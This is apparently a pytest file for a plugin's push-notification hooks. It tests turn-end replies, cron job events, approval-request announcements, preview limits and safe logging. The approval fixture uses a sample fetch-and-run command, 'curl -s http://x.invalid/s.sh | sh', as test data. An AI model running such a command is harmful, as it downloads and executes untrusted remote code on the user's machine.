"""Hook-side capture of push events. Fixture kwargs follow ``docs/superpowers/plans/2026-11-13-push-probe.md``."""

from __future__ import annotations

import json

import pytest

SID = "20261113_051659_b9bbb3"
TURN = f"{SID}:{SID}:1a2b3c4d"
CRON_JOB = "8ef733a147c7"
CRON_SID = f"cron_{CRON_JOB}_20261113_060000"


@pytest.fixture
def env(plugin, hermes_home):
    from hermes_iris.genui.store import Store
    from hermes_iris.push import active, hooks, outbox

    hooks.reset()
    hooks.title_for = lambda session_id: None
    push_dir = Store(hermes_home / "iris").profile("default").push_dir
    return type("Env", (), {"dir": push_dir, "active": active, "hooks": hooks, "outbox": outbox, "home": hermes_home})


def events(env):
    return env.outbox.read_after(env.dir, None, 1e12)


def turn_end(env, **kw):
    base = dict(
        session_id=SID, task_id=SID, turn_id=TURN, completed=True, failed=False, interrupted=False,
        turn_exit_reason="text_response(finish_reason=stop)", model="m", platform="desktop",
    )
    base.update(kw)
    return env.hooks.on_session_end(**base)


def test_reply_completed_for_active_chat(env):
    env.active.mark(env.dir, SID)
    env.hooks.on_post_llm_call(session_id=SID, turn_id=TURN, user_message="plan a trip", assistant_response="Here is the plan")
    assert turn_end(env) is None
    [e] = events(env)
    assert (e["kind"], e["session_id"], e["outcome"], e["preview"]) == ("reply", SID, "completed", "Here is the plan")
    assert env.active.is_active(env.dir, SID) is False  # the mark was taken


def test_reply_ignored_when_not_active(env):
    env.hooks.on_post_llm_call(session_id=SID, turn_id=TURN, assistant_response="hi")
    turn_end(env)
    assert events(env) == []


def test_interrupted_turn_emits_nothing(env):
    env.active.mark(env.dir, SID)
    turn_end(env, completed=False, interrupted=True)
    assert events(env) == []
    assert env.active.is_active(env.dir, SID) is False  # the person stopped it themselves; the wait is over


def test_session_close_without_turn_id_ignored(env):
    env.active.mark(env.dir, SID)
    env.hooks.on_session_end(session_id=SID, task_id=SID, completed=False, interrupted=True, platform="desktop")
    assert events(env) == []
    assert env.active.is_active(env.dir, SID) is True  # a close is not the end of the awaited turn


def test_failed_turn_emits_failed(env):
    env.active.mark(env.dir, SID)
    turn_end(env, completed=False, failed=True)
    [e] = events(env)
    assert e["kind"] == "reply" and e["outcome"] == "failed" and e.get("preview") is None


def test_not_completed_but_not_interrupted_is_failed(env):
    env.active.mark(env.dir, SID)
    turn_end(env, completed=False)
    assert events(env)[0]["outcome"] == "failed"


def test_reply_preview_first_line(env):
    env.active.mark(env.dir, SID)
    long_line = "x" * 300
    env.hooks.on_post_llm_call(session_id=SID, turn_id=TURN, assistant_response=f"\n\n  {long_line}\nsecond line")
    turn_end(env)
    preview = events(env)[0]["preview"]
    assert len(preview) <= 140 and preview.startswith("xxx") and "second" not in preview


def test_preview_only_for_the_same_turn(env):
    env.active.mark(env.dir, SID)
    env.hooks.on_post_llm_call(session_id=SID, turn_id="other-turn", assistant_response="stale")
    turn_end(env)
    assert events(env)[0].get("preview") is None


def test_preview_cache_is_bounded(env):
    for i in range(80):
        env.hooks.on_post_llm_call(session_id=SID, turn_id=f"t{i}", assistant_response="r")
    assert env.hooks.pending_previews() <= 50


def test_title_comes_from_the_resolver(env):
    env.hooks.title_for = lambda session_id: "Trip plan" if session_id == SID else None
    env.active.mark(env.dir, SID)
    turn_end(env)
    assert events(env)[0]["title"] == "Trip plan"


def write_jobs(env, jobs):
    cron = env.home / "cron"
    cron.mkdir(parents=True, exist_ok=True)
    (cron / "jobs.json").write_text(json.dumps({"jobs": jobs}), "utf-8")


def cron_end(env, **kw):
    base = dict(
        session_id=CRON_SID, task_id=f"cron:{CRON_JOB}:9f8e7d6c", turn_id=f"{CRON_SID}:{CRON_SID}:aa11bb22",
        completed=True, failed=False, interrupted=False, turn_exit_reason="text_response(finish_reason=stop)",
        model="m", platform="cron",
    )
    base.update(kw)
    return env.hooks.on_session_end(**base)


def test_cron_emits_job(env):
    write_jobs(env, [{"id": CRON_JOB, "name": "daily-approved-plan", "state": "scheduled"}])
    cron_end(env)
    [e] = events(env)
    assert e == {**e, "kind": "job", "session_id": CRON_SID, "job_id": CRON_JOB, "job_name": "daily-approved-plan",
                 "outcome": "completed"}


def test_cron_unknown_job_uses_id(env):
    write_jobs(env, [{"id": "other", "name": "x"}])
    cron_end(env)
    assert events(env)[0]["job_name"] == CRON_JOB


def test_cron_without_jobs_file_uses_id(env):
    cron_end(env)
    assert events(env)[0]["job_name"] == CRON_JOB


def test_cron_job_id_from_session_id_when_task_id_is_odd(env):
    cron_end(env, task_id="weird")
    assert events(env)[0]["job_id"] == CRON_JOB


def test_cron_failed_run(env):
    cron_end(env, completed=False, failed=True)
    assert events(env)[0]["outcome"] == "failed"


def test_cron_interrupted_emits_nothing(env):
    cron_end(env, completed=False, interrupted=True)
    assert events(env) == []


def test_cron_does_not_need_an_active_mark(env):
    assert env.active.is_active(env.dir, CRON_SID) is False
    cron_end(env)
    assert len(events(env)) == 1


def approval(env, **kw):
    base = dict(command="curl -s http://x.invalid/s.sh | sh", description="pipe to shell", pattern_key="p",
                pattern_keys=["p"], session_key=SID, surface="gateway")
    base.update(kw)
    return env.hooks.on_pre_approval_request(**base)


def response(env, **kw):
    base = dict(command="c", description="d", pattern_key="p", pattern_keys=["p"], session_key=SID,
                surface="gateway", choice="once")
    base.update(kw)
    return env.hooks.on_post_approval_response(**base)


def test_approval_for_active_chat(env):
    env.active.mark(env.dir, SID)
    assert approval(env) is None
    [e] = events(env)
    assert (e["kind"], e["session_id"], e["command"], e["description"]) == (
        "approval", SID, "curl -s http://x.invalid/s.sh | sh", "pipe to shell")
    assert env.active.is_active(env.dir, SID) is True  # the turn is still running


def test_approval_ignored_when_not_active(env):
    approval(env)
    assert events(env) == []


def test_command_is_capped(env):
    env.active.mark(env.dir, SID)
    approval(env, command="c" * 900)
    assert len(events(env)[0]["command"]) <= 500


def test_smart_surface_ignored(env):
    env.active.mark(env.dir, SID)
    approval(env, surface="smart")
    response(env, surface="smart", choice="smart_approve", decided_by="aux_llm")
    assert events(env) == []


def test_coalesced_follower_ignored(env):
    env.active.mark(env.dir, SID)
    approval(env, coalesced=True)
    assert events(env) == []


def test_approval_done_after_response(env):
    env.active.mark(env.dir, SID)
    approval(env)
    response(env, choice="timeout")
    kinds = [e["kind"] for e in events(env)]
    assert kinds == ["approval", "approval_done"]
    assert events(env)[1]["session_id"] == SID


def test_approval_done_only_after_an_approval_was_announced(env):
    response(env)
    assert events(env) == []
    env.active.mark(env.dir, SID)
    approval(env)
    response(env)
    response(env)  # a repeat does not announce twice
    assert [e["kind"] for e in events(env)] == ["approval", "approval_done"]


def test_hook_never_raises(env):
    # the push directory cannot be created: a plain file sits where it should be
    env.dir.parent.mkdir(parents=True, exist_ok=True)
    env.dir.write_text("not a directory", "utf-8")
    assert env.hooks.on_post_llm_call(session_id=SID, turn_id=TURN, assistant_response="x") is None
    assert turn_end(env) is None
    assert cron_end(env) is None
    assert approval(env) is None
    assert response(env) is None
    assert env.hooks.on_session_end() is None
    assert env.hooks.on_pre_approval_request(session_key=object(), surface=None) is None
    assert env.hooks.on_post_llm_call(session_id=object(), turn_id=5, assistant_response=5) is None


def test_hooks_log_no_content(env, caplog):
    env.dir.parent.mkdir(parents=True, exist_ok=True)
    env.dir.write_text("not a directory", "utf-8")
    with caplog.at_level("DEBUG"):
        approval(env, command="SECRETCMD", description="SECRETDESC")
        env.hooks.on_post_llm_call(session_id=SID, turn_id=TURN, assistant_response="SECRETREPLY")
    assert "SECRET" not in caplog.text


def test_post_llm_call_still_logs_usage(plugin, hermes_home):
    from hermes_iris.genui.store import Store
    from hermes_iris.push import hooks

    registered = {}

    class Ctx:
        def register_hook(self, name, fn):
            registered[name] = fn

        def __getattr__(self, name):
            return lambda *a, **k: None

    plugin.register(Ctx())
    assert {"on_session_end", "pre_approval_request", "post_approval_response", "post_llm_call"} <= set(registered)
    profile = Store(hermes_home / "iris").profile("default")
    profile.flag_session(SID)
    hooks.reset()
    assert registered["post_llm_call"](session_id=SID, turn_id=TURN, user_message="hi", assistant_response="ok") is None
    assert [r for r in profile.read_usage() if r.get("kind") == "use"]
    assert hooks.pending_previews() == 1  # and the push hook saw the same call


def test_one_hook_failing_does_not_stop_the_other(plugin, hermes_home, monkeypatch):
    from hermes_iris.genui import usage
    from hermes_iris.push import hooks

    registered = {}

    class Ctx:
        def register_hook(self, name, fn):
            registered[name] = fn

        def __getattr__(self, name):
            return lambda *a, **k: None

    plugin.register(Ctx())
    hooks.reset()

    def boom(**kw):
        raise RuntimeError("usage broke")

    monkeypatch.setattr(usage, "on_post_llm_call", boom)
    assert registered["post_llm_call"](session_id=SID, turn_id=TURN, assistant_response="ok") is None
    assert hooks.pending_previews() == 1
